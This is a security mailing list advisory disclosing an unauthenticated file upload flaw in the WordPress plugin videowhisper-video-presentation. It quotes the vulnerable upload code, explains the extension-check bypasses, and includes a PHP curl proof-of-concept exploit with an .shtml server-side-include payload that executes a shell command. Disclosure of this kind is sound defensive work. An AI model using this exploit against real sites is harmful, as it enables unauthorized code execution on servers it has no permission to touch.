  oss-security - Remote file upload vulnerability in wordpress plugin  videowhisper-video-presentation            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 31 Mar From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Remote file upload vulnerability in wordpress plugin  videowhisper-video-presentation  Title: Remote file upload vulnerability in wordpress plugin videowhisper-video-presentation Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/videowhisper-video-presentation/ Vendor: http://www.videowhisper.com/ Vendor Notified: won’t fix, Vendor Contact: http://www.videowhisper.com/tickets_submit.php Advisory: Description: from the site  "VideoWhisper Video Consultation is a web based video communication solution designed for online video consultations, interactive live presentations, trainings, webinars, coaching and online collaboration with webcam support. Read more on WordPress Video Presentation plugin home page."  Vulnerability: From wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php Allows various remote unauthenticated file uploads, among the file types is html where the last 4 characters are only being checked in a file name to match which types are allowed. Because of this .shtml can be passed through and remote code execution if SSI is allowed. The code does not do any user access validation and therefore anyone can upload the following files to an unsuspecting wordpress site: .shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,.mp3,.flv,.avi,.mpg,.ppt,.pps  The  if (strstr($filename,'.php')) exit;   can be by passed by using the extension .Php but the file extension check would allow files like test.Php.shtml <?php  if ($_GET["room"]) $room=$_GET["room"];  if ($_POST["room"]) $room=$_POST["room"];  $filename=$_FILES['vw_file']['name'];  include_once("incsan.php");  sanV($room);  if (!$room) exit;  sanV($filename); if (!$filename) exit;  if (strstr($filename,'.php')) exit; //do not allow uploads to other folders if ( strstr($room,"/") || strstr($room,"..") ) exit;  if ( strstr($filename,"/") || strstr($filename,"..") ) exit;  $destination="uploads/".$room."/“;  if ($_GET["slides"]) $destination .= "slides/“;  $ext=strtolower(substr($filename,-4)); $allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt",".pps”); if (in_array($ext,$allowed)) move_uploaded_file($_FILES['vw_file']['tmp_name'], $destination . $filename);  ?>loadstatus=1 CVEID: TBD OSVDB: TBD Exploit Code: 	videowhis_poc.php         <?php 	   	 $uploadfile="upexp.shtml"; 	 $ch =  	 curl_init("http://target_site/wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php"); 	 curl_setopt($ch, CURLOPT_POST, true); 	 curl_setopt($ch, CURLOPT_POSTFIELDS, 	          array('vw_file'=>"@$uploadfile",'name'=>'upexp.shtml','room'=>'.')); 	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 	 $postResult = curl_exec($ch); 	 curl_close($ch); 	 print "$postResult"; 	   	 ?> 	   	   	 upexp.shtml 	   	 <html> 	   	 <!--#exec cmd="/usr/bin/date > /tmp/p" --> 	   	 this is html 	 </html> 	   	   	 The executeable should be located in wordpress/wp-content/plugins/videowhisper-video-conference-integration/vc/uploads Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      